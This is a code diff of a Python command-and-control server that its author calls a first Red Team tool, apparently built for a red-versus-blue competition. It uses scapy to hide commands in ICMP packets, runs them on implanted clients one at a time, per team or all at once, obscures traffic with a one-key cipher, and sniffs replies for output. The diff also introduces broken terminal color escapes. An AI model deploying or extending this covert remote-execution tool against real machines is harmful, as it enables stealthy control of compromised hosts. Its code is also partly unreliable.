@@ -1,18 +1,23 @@
+# Author: Anthony Ioppolo
+# My first attempt at a Red Team tool, gonna make it cool dont worry about it
+# ICMP C2, think about it
+# Storing client as /etc/icmpd service
+
 from scapy.all import * 
 from scapy.all import ICMP,IP
 import json
 import threading
 
-# STILL IN PRODUCTION
+# STILL IN PRODUCTION PLEASE DONT JUDGE I DIDNT HAVE A LOT OF TIME
 
 DEBUG = True                   # Set to display statements after command execution
 DEVDEBUG = False               # Set to display statements specific to debugging issues
 JSONFILE = "targets.json"      # Set to point to configuration files with loadclients
 SuperSecretMode = False        # Enables "encryption"
-KEY = "B"
+KEY = "B"                      # Key for "encryption"
 # CLOUD = "172"                # No valid cloud targets in IRSEC
-LAN = "10"
-ALIVE = dict()
+LAN = "10"                     # Helps specify what octet to look for team X octet
+ALIVE = dict()                 # All responding clients
 
 def print_title(): 
     print(".__                          ___             .__.__    ___") 
@@ -32,6 +37,7 @@ def print_help():
     print("\tsendtoall <message>      Sends <message> to all clients")
     print("\texeonall <command>       Execute <command> on all clients")
     print("\tloadclients              Loads all clients specified in JSONFILE")
+    print("\tcheckalive               Generates a board of replying clients")
     # print("\tshell <ID>               Creates a direct line with client at ID")
     print("\tkill                     Stops server")
     print("\tssm                      Enables Super Secret Mode")                    
@@ -54,7 +60,6 @@ def json_add_client(ip, clients, id):
 # Show all clients within the client dictionary 
 def showclients(clients):
     for client in clients:
-
         print(f"Client {client} at {clients.get(client)}")
 
 # Remove the client by client ID
@@ -105,6 +110,7 @@ def encrypt_decrypt(plaintext):
 def send_over_icmp(clientip, command, execute):
     global SuperSecretMode
     encrypted = encrypt_decrypt(command)
+    # Adds header to command
     if execute:
         if SuperSecretMode:
             clientcommand = "!!!$1" + encrypted
@@ -141,6 +147,7 @@ def exeonall(arguments, clients, execute):
             if DEBUG and SuperSecretMode: print(f"[DEBUG] \"{arguments[1]}\" sent to {client} at {clients.get(client)} (Super Secretly)")
             elif DEBUG: print(f"[DEBUG] \"{arguments[1]}\" sent to {client} at {clients.get(client)}")
 
+# Execute on a specific team
 def exeonteam(arguments, clients, execute):
     global SuperSecretMode
     if len(arguments)<2: 
@@ -153,6 +160,7 @@ def exeonteam(arguments, clients, execute):
                     send_over_icmp(clients.get(client), arguments[1], execute)
                     if DEBUG and SuperSecretMode: print(f"[DEBUG] \"{arguments[1][2:]}\" sent to {client} at {clients.get(client)} on team {octets[1]} (Super Secretly)")
                     elif DEBUG: print(f"[DEBUG] \"{arguments[1][2:]}\" sent to client {client} at {clients.get(client)} on team {octets[1]}")
+
             # [REMOVED CLOUD MODE FOR IRSEC]
             # if octets[0] == CLOUD:                                    
             #     if str(arguments[1][0]) == str(octets[2]):
@@ -204,6 +212,7 @@ def listen(pkt):
     else:
         command = parsed[1][:-1]
         if command[0] == "$":
+            # Decrypt and make output prettier
             output = encrypt_decrypt(command[1:])
             newlineparsed = output.replace("\\\\n","\n")
             newlineparsed = newlineparsed.replace("s\'n","\n")
@@ -215,6 +224,7 @@ def listen(pkt):
             print(f"Recieved from {src}:\n\t{command[0:2]} {newlineparsed}")
             check_alive(src, command)
 
+# Parses client for ALIVE board response
 def check_alive(src, command):
     global ALIVE
     if "alive" in command:
@@ -222,19 +232,21 @@ def check_alive(src, command):
     else:
         ALIVE[src] = False
 
+# Print ALIVE status per client
 def show_alive(clients):
     global ALIVE
     for value in ALIVE:
-        print(value)
         if ALIVE[value] == True:
-            print(f"\033[92m[{clients[value]}]\033[0m", end=" ")
+            print(f"\03392m[{list(clients.keys())[list(clients.values()).index(value)]}]\033[0m", end=" ")
         elif ALIVE[value] == False: 
-            print(f"\03391m[{clients[value]}]\033[0m", end=" ")
+            print(f"\03391m[{list(clients.keys())[list(clients.values()).index(value)]}]\033[0m", end=" ")
     print()
 
+# Starts the sniffing thread
 def sniffer():
     sniff(filter="icmp[icmptype] == icmp-echoreply", prn=listen)
 
+# Enables SuperSecretMode for traffic encryption
 def change_ssm():
     global SuperSecretMode
     if SuperSecretMode: 
@@ -283,7 +295,7 @@ def main():
         elif arguments[0] == "exeonteam":
             exeonteam(arguments, clients, execute=True)
         elif arguments[0] == "checkalive":
-            for client in clients: ALIVE[clients.ge(client)] = False
+            for client in clients: ALIVE[clients.get(client)] = False
             arguments = ["checkalive", "alive"]
             sendtoall(arguments, clients, execute=False)
             time.sleep(7)
